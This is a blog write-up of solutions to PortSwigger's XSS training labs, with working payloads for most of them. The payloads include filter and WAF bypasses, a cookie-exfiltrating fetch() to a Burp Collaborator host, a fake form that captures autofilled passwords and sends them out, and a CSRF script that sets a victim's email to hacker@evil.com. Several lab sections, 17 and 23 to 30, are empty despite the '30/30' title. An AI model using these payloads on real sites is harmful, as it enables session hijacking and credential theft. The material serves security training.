---
title: Burp Suite Certified Practitioner - XSS Labs (30/30)
date: 2021-10-27
categories:
  - "Web 2.0 Security"
---

In this post, we will go over my solutions to all cross-site scripting labs available in [Burp Academy](https://portswigger.net/web-security/cross-site-scripting). 

🧵⬇️

### Table of Content <!-- omit in toc -->

- [Lab 01 - Reflected XSS into HTML context with nothing encoded](#lab-01---reflected-xss-into-html-context-with-nothing-encoded)
- [Lab 02 - Stored XSS into HTML context with nothing encoded](#lab-02---stored-xss-into-html-context-with-nothing-encoded)
- [Lab 03 - DOM XSS in document.write sink using source location.search](#lab-03---dom-xss-in-documentwrite-sink-using-source-locationsearch)
- [Lab 04 - DOM XSS in document.write sink using source location.search inside a select element](#lab-04---dom-xss-in-documentwrite-sink-using-source-locationsearch-inside-a-select-element)
- [Lab 05 - DOM XSS in innerHTML sink using source location.search](#lab-05---dom-xss-in-innerhtml-sink-using-source-locationsearch)
- [Lab 06 - DOM XSS in jQuery anchor href attribute sink using location.search source](#lab-06---dom-xss-in-jquery-anchor-href-attribute-sink-using-locationsearch-source)
- [Lab 07 - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](#lab-07---dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded)
- [Lab 08 - Reflected DOM XSS](#lab-08---reflected-dom-xss)
- [Lab 09 - Stored DOM XSS](#lab-09---stored-dom-xss)
- [Lab 10 - Exploiting cross-site scripting to steal cookies](#lab-10---exploiting-cross-site-scripting-to-steal-cookies)
- [Lab 11 - Exploiting cross-site scripting to capture passwords](#lab-11---exploiting-cross-site-scripting-to-capture-passwords)
- [Lab 12 - Exploiting stored XSS to perform CSRF](#lab-12---exploiting-stored-xss-to-perform-csrf)
- [Lab 13 - Reflected XSS into HTML context with most tags and attributes blocked](#lab-13---reflected-xss-into-html-context-with-most-tags-and-attributes-blocked)
- [Lab 14 - Reflected XSS into HTML context with all tags blocked except custom ones](#lab-14---reflected-xss-into-html-context-with-all-tags-blocked-except-custom-ones)
- [Lab 15 - Reflected XSS with event handlers and href attributes blocked](#lab-15---reflected-xss-with-event-handlers-and-href-attributes-blocked)
- [Lab 16 - Reflected XSS with some SVG markup allowed](#lab-16---reflected-xss-with-some-svg-markup-allowed)
- [Lab 17 - Reflected XSS into attribute with angle brackets HTML-encoded](#lab-17---reflected-xss-into-attribute-with-angle-brackets-html-encoded)
- [Lab 18 - Stored XSS into anchor href attribute with double quotes HTML-encoded](#lab-18---stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded)
- [Lab 19 - Reflected XSS in canonical link tag](#lab-19---reflected-xss-in-canonical-link-tag)
- [Lab 20 - Reflected XSS into a JavaScript string with single quote and backslash escaped](#lab-20---reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped)
- [Lab 21 - Reflected XSS into a JavaScript string with angle brackets HTML encoded](#lab-21---reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded)
- [Lab 22 - Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](#lab-22---reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped)
- [Lab 23 - Reflected XSS in a JavaScript URL with some characters blocked](#lab-23---reflected-xss-in-a-javascript-url-with-some-characters-blocked)
- [Lab 24 - Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](#lab-24---stored-xss-into-onclick-event-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-and-backslash-escaped)
- [Lab 25 - Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](#lab-25---reflected-xss-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-unicode-escaped)
- [Lab 26 - Reflected XSS with AngularJS sandbox escape without strings](#lab-26---reflected-xss-with-angularjs-sandbox-escape-without-strings)
- [Lab 27 - Reflected XSS with AngularJS sandbox escape and CSP](#lab-27---reflected-xss-with-angularjs-sandbox-escape-and-csp)
- [Lab 28 - Reflected XSS protected by CSP, with dangling markup attack](#lab-28---reflected-xss-protected-by-csp-with-dangling-markup-attack)
- [Lab 29 - Reflected XSS protected by very strict CSP, with dangling markup attack](#lab-29---reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack)
- [Lab 30 - Reflected XSS protected by CSP, with CSP bypass](#lab-30---reflected-xss-protected-by-csp-with-csp-bypass)

### Lab 01 - Reflected XSS into HTML context with nothing encoded

https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

The user input in search bar is reflected to the user in the page without any encoding, therefore allowing to inject valid Javascript. This is the simplest case of reflected XSS.

**Solution**

```js
<svg/onload=alert(1)>
```

### Lab 02 - Stored XSS into HTML context with nothing encoded

https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

The comment section in blog posts allow us to inject any special characters without any encoding, therefore allowing us to inject valid Javascript that will be interpreted by the browser of all readers of that specific post. This is the simplest case of stored XSS.

**Solution**

```
<svg/onload=alert(1)>
```

### Lab 03 - DOM XSS in document.write sink using source location.search

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

In this lab, we observe how injecting arbitray user input into the *Document Object Model (DOM)* can lead to XSS. This class of attack is called DOM-based XSS.

The following JavaScript function will take the input from the `location.search` source (user data in the `search` parameter) and will inject it to the `document.write` sink:

```
function trackSearch(query) {
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
	trackSearch(query);
}
```

As an attacker, we just need to escape from the enclosing double-quote `"` and inject our XSS payload. For example, here we can use the `onload` event inside the `<img>` and trigger an alert.

**Solution**

```
" onload=alert(1) "
```

### Lab 04 - DOM XSS in document.write sink using source location.search inside a select element

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element

This lab is similar to the DOM XSS presented in [lab 03](#lab-03---dom-xss-in-documentwrite-sink-using-source-locationsearch). The user input will be injected to a `document.write` sink without any sanitization.

Our payload will be written to the DOM as follows: `<option selected>**PAYLOAD**</option>`
```
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
	document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
	if(stores[i] === store) {
		continue;
	}
	document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

**Solution**

```
<script>alert(1)</script>
```

### Lab 05 - DOM XSS in innerHTML sink using source location.search

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink

This lab is similar to the DOM XSS presented in [lab 03](#lab-03---dom-xss-in-documentwrite-sink-using-source-locationsearch). The user input will be injected to a `innerHTML` sink instead.

**Solution**

```
<svg/onload=alert`1`>
```

### Lab 06 - DOM XSS in jQuery anchor href attribute sink using location.search source

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink

Using JavaScript library such as jQuery can introduce other types of potentially vulnerable sinks. In this lab, we see that the following function will alter the DOM by passing the contents of the `returnPath` parameter to the `attr()` function/sink.

```
<script>
$(function() {
	$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
</script>
```

Here are some other example of sinks that can be used to trigger DOM XSS:

The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:

```
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```
**Solution**

```
javascript:alert(1)
```

### Lab 07 - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression

Another popular JavaScript framework commonly seen in modern webapps is Angular. One useful technique to know with Angular-enabled applications, is that it allows to trigger XSS without the need of angle brackets.

Angular searches for the `ng-app` attribute (called a "directive") in the HTML source. When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces.

*Note: the library also introduces a **sandboxing** mechanism which protects from evaluate unsafe JavaScript expressions. Exploitation will depend on the Angular version, more on that in an another lab further down*

**Solution**

```
{{constructor.constructor('alert(1)')()}}
```

### Lab 08 - Reflected DOM XSS

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected

In this lab, the server processes our user input from the request, and echoes it data into the response. We identify the vulnerable sink `eval()` and place a breakpoint try and understand the flow.

For now, we will use a dummy parameter value `?search=placeholder`. Our input is reflected as part of a JSON object in `responseText`:
```
{
  "results":[],
  "searchTerm":"placeholder"
}
```

To trigger our XSS, we will need to escape from the string context and inject our payload. At first , we notice that the application automatically escapes any extra quotes by pre-pending an escape character `\`.

However, it fails to escape the escaping character itself  - therefore we can nullify its effect and inject our payload.

**Solution**

```
\\"-alert(1)}//
```

### Lab 09 - Stored DOM XSS

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored

In this lab we see an example of an insecure way to sanitize user input in an attempt to prevent DOM XSS. The input sanitization function apples the `escapeHTML()` function to user data before injecting in the DOM.

```
function escapeHTML(html) {
	return html.replace('<', '&lt;').replace('>', '&gt;');
}
```

As we can see in the `replace()` documentation:

> The replace() method searches a string for a specified value, or a regular expression, and returns a new string where the specified values are replaced.
> Note: If you are replacing a value (and not a regular expression), **only the first instance** of the value will be replaced.

*- https://www.w3schools.com/jsref/jsref_replace.asp*

Therefore, only the first encountered `<>` characters will be encoded.

**Solution**

```
<><img src=x onerror=alert()>
```

### Lab 10 - Exploiting cross-site scripting to steal cookies

https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies

In this lab, we see an example of how we can easily steal a victim's cookies using a stored XSS.

It is important to note that this attack is possible because the web application does not secure `session` cookies with the `HttpOnly` flag. This flag tells the browser whether it should allow access to its cookie jar via Javascript.

In our case, the absence of the flag makes it trivial for our XSS payload to recover and exfiltrate the victim's session cookies.

*Note: there are known techniques to bypass HttpOnly flag but it is not in the scope of this exercise*

**Solution**

```
<svg/onload=fetch('https://re93pd647tg98da5ko0fz75ep5vvjk.burpcollaborator.net',{method:'POST',mode:'no-cors',body:document.cookie})>
```

### Lab 11 - Exploiting cross-site scripting to capture passwords

https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords

In this lab, we see how we can steal a victim's credentials by exploiting browsers **autofill** functionality.

*Read more about this technique: https://ancat.github.io/xss/2017/01/08/stealing-plaintext-passwords.html*

The stored XSS is again located in the comment section of the application. Our goal is to create a fake `input` field that will induce the victim's browser to autofill credentials that match for the website's domain name.

Then, we exfiltrate the content by combining the `onchange` event with a call to the [fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch) API to a domain under our control. This will send us the victim's credentials as soon as the input field is filled with data.

**Solution**

```
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

### Lab 12 - Exploiting stored XSS to perform CSRF

https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

In this lab we see how we can leverage a **stored XSS** to perform a **CSRF** attack on a victim. We are targetting the `/change-email` functionnality to forcefully change the victim's e-mail address to something under our control.

The web application uses anti-CSRF tokens to prevent such kinds of attacks, but we can extract it by leveraging a stored XSS located in the blog comments.

1) Victim requests the page containing the anti-CSRF token we want to extract (`/my-account`). The browser will automatically pass-on the user's cookies (`allowCredentials=true`)

2) A second request is sent to modify the email address which will append both the session cookies and the `csrf` token extracted in step 1)

**Solution**

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open("get", "/my-account", true);
req.send();
function handleResponse() {
	var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
	var changeReq = new XMLHttpRequest();
	changeReq.open("post", "/my-account/change-email", true);
	changeReq.send("csrf="+token+"&email=hacker@evil.com");
};
</script>
```

### Lab 13 - Reflected XSS into HTML context with most tags and attributes blocked

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked

The user input in search bar is reflected in the page but there is a WAF protection the application against common XSS payloads.

```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
X-XSS-Protection: 0
Connection: close
Content-Length: 20

"Tag is not allowed"
```

We use Burp Intruder to check against a pre-compiled list of HTML tags to see what is blacklisted:

`GET /?search=<§§>` in Intruder

`<body(...)>` seems to pass the blacklist and is a known XSS vector

```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
X-XSS-Protection: 0
Connection: close
Content-Length: 26

"Attribute is not allowed"
```

Now we need to do the same for attributes:

`GET /?search=<body §§>` in Intruder where `§§` is our injection point.

`onresize` seems to be accepted and can be combined with `body` to create a payload:

```
<body onresize="alert(1)">
```

All there is left to do is deliver the payload to the victim. It has to be interaction-free to pass the lab.

The user will load an iframe containing our rXSS payload which we will then proceed to trigger the `onresize` event by changing its style.

`<iframe src={lab instance url}/?search={URL encoded payload} onload=this.style.width='100px'>`

**Solution**

```
<iframe src=https://ac1d1f931e6c53d0c0024e0200d10019.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E onload=this.style.width='100px'>
```

### Lab 14 - Reflected XSS into HTML context with all tags blocked except custom ones

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked

Similar to previous lab except only **custom tags** are allowed.

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onfocus

We can trigger a XSS with the **onfocus(in|out)** event handler.

Once again, we deliver it our payload to the victim with an **iframe** that will execute Javascript to focus on the `<div>` upon loading.

```
<iframe src={lab instance url}/?search={URL encoded payload}#xss>
```

Payload:

```
<xss id=xss tabindex=1 onfocusin=alert(document.cookie)></xss>
```

**Solution**

```
<iframe src=https://ac6b1f4c1ea25374c01b644300f600bc.web-security-academy.net/?search=<xss id=xss tabindex=1 onfocusin=alert(document.cookie)></xss>#xss>
```

### Lab 15 - Reflected XSS with event handlers and href attributes blocked

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked

The user input in search bar is reflected in the page but there is a WAF protection the application against common XSS payloads. On top of that, all event handlers are blacklisted.

It is **still possible** to trigger XSS without the use of **event tags**. Generally, the technique relies on using anchor tags `<a>` in combination with the `href` attribute. Here `href` **as an attribute** is blocked. However, we can trick the WAF by embedding it inside a `<animate>` **svg** tag.

The WAF will not consider `href` as an attribute and allow the request to go through, however, the victim's browser will parse `href` as if it was an attribute and execute the `javascript:...` payload passed in `values` .

Read https://blog.isec.pl/xss-fun-with-animated-svg/ for more details about this technique

**Solution**

*Note: we need to label our vector with the word "Click" in order to induce the simulated lab user to perform a click action.*

```
<svg><a><animate attributeName="href" values="javascript:alert(1)"></animate><text x="20" y="20">Click Me</text></a></svg>
```

### Lab 16 - Reflected XSS with some SVG markup allowed

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed

User input in the search bar is reflected on the page but there is a WAF protecting the application against common XSS payloads.

We are permitted to use `<svg>` tags which is a common XSS vector.

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#svg

**Solution**
```
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

### Lab 17 - Reflected XSS into attribute with angle brackets HTML-encoded

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded

### Lab 18 - Stored XSS into anchor href attribute with double quotes HTML-encoded

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded

In this lab we see how it is possible to trigger an XSS while having the double quote `"` character encoded by the application.

Our injection point is the content of the `href` parameter which gets populated by the data in `website` parameter when posting a comment. It is possible to use a JavaScript URL with the `javascript:` prefix which will be interpreted by the browser.

Once a user clicks on the author of a post, the XSS will be triggered.

**Solution**

```
javascript:alert(1) 
```

### Lab 19 - Reflected XSS in canonical link tag

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag

This lab reflects user input in a [canonical link](https://en.wikipedia.org/wiki/Canonical_link_element#:~:text=A%20canonical%20link%20element%20is,went%20live%20in%20April%202012.) tag and escapes angle brackets.

It is possible to induce a user into triggering XSS payloads in **unexploitable** tags such as : `input hidden`, `link`, `canonical` by using the `accesskey` attribute.

This requires **user interaction**, as the victim needs to press the required key to fire the payload.

Example:

`<input type="hidden" accesskey="X" onclick="alert(1)">`

**Solution**

On macOS, `CTRL+OPTION+X` will trigger the `onclick` event

```
https://<burp_instance_url>/?%27onclick=%27alert(1)%27accesskey=%27X
```

### Lab 20 - Reflected XSS into a JavaScript string with single quote and backslash escaped

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped

In this lab, the contents of the `search` parameter is reflected inside a JavaScript string. The application attempt to defend against XSS by escaping both quotes `'` and backslashes `\` to prevent from breakout out of `searchTerms`.

```
<script>
	var searchTerms = '**PAYLOAD**';
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

However, we are still able to inject tags! This allows us to break out of the JavaScript context entirely and inject whatever subsequent content we want.

**Solution**

```
</script><svg/onload=alert()>
```

### Lab 21 - Reflected XSS into a JavaScript string with angle brackets HTML encoded

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded

This lab is similar to the previous one, but this around angle brackets will be encoded. We just have to take the opposite approach and leverage the fact that we can break out of `searchTerms` by inject single quotes.

```
<script>
	var searchTerms = '**Payload**';
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Since our input will directly be injected in a JavaScript string context, we do not even need tags to execute JS code.

**Solution**

```
?search=';alert()//
```

### Lab 22 - Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped

This time around we are unable any of the following characters `< > ' "`. Once again, the developers mistake was to forget also escaping the backslash character.

**Solution**

```
?search=\';alert();//
```

### Lab 23 - Reflected XSS in a JavaScript URL with some characters blocked

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked

### Lab 24 - Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped

### Lab 25 - Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped

### Lab 26 - Reflected XSS with AngularJS sandbox escape without strings

https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox/lab-angular-sandbox-escape-without-strings

### Lab 27 - Reflected XSS with AngularJS sandbox escape and CSP

https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox/lab-angular-sandbox-escape-and-csp

### Lab 28 - Reflected XSS protected by CSP, with dangling markup attack

https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-with-dangling-markup-attack

### Lab 29 - Reflected XSS protected by very strict CSP, with dangling markup attack

https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack

### Lab 30 - Reflected XSS protected by CSP, with CSP bypass

https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass
